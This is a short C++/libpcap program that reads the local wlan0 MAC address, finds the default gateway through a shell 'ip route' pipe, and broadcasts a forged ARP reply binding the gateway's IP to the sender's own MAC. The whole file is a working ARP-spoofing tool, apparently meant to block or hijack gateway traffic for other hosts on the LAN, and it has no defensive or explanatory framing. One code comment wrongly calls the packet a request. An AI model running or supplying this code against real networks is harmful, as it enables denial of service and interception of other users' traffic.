// C++
#include <array>
#include <fstream>
#include <iostream>
#include <memory>
#include <string>

// libpcap
#include <pcap.h>

#include "packet.h"

void fastio() {
    std::ios_base::sync_with_stdio(false);
    std::cin.tie(0);
    std::cout.tie(0);
}

void blockArp(TxArpPacket &request, std::string my_mac, uint32_t gatewayIp) {
    // send arp request to all ip
    // assumption : subnet mask is 255.255.255.0

    request.ethhdr.parseDst("FF:FF:FF:FF:FF:FF");
    request.ethhdr.parseSrc(my_mac);
    request.ethhdr.type_ = EthHdr::arp;
    request.arphdr = {
        ArpHdr::ethernet,
        ArpHdr::ipv4,
        6,
        4,
        ArpHdr::reply,
        {},
        gatewayIp,
        {},
        gatewayIp};
    request.arphdr.parseSrc(my_mac);
    request.arphdr.parseDst("00:00:00:00:00:00");
}

std::string resolveGatewayIp() {
    std::string ipCmd = "ip route show table 0 | grep ^def | cut -d ' ' -f 3";
    std::array<char, 128> buffer;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(ipCmd.c_str(), "r"), pclose);
    if (!pipe)
        throw std::runtime_error("popen() failed");
    fgets(buffer.data(), buffer.size(), pipe.get());
    return buffer.data();
}

int main(int argc, char *argv[]) {
    fastio();

    RxPacket *rxPacket = new RxPacket;
    std::string interface = "wlan0";
    if (!rxPacket->openPcap(interface.c_str()))
        return -1;

    std::ifstream address;
    address.open("/sys/class/net/" + interface + "/address", std::ifstream::in);
    std::string my_mac;
    address >> my_mac;

    union {
        uint8_t ipmask[4];
        uint32_t gatewayIp;
    };

    std::string gatewayStr = resolveGatewayIp();
    sscanf(gatewayStr.c_str(), "%hhu.%hhu.%hhu.%hhu", &ipmask[3], &ipmask[2], &ipmask[1], &ipmask[0]);

    TxArpPacket request;
    blockArp(request, my_mac, gatewayIp);
    rxPacket->sendPkt(&request);

    return 0;
}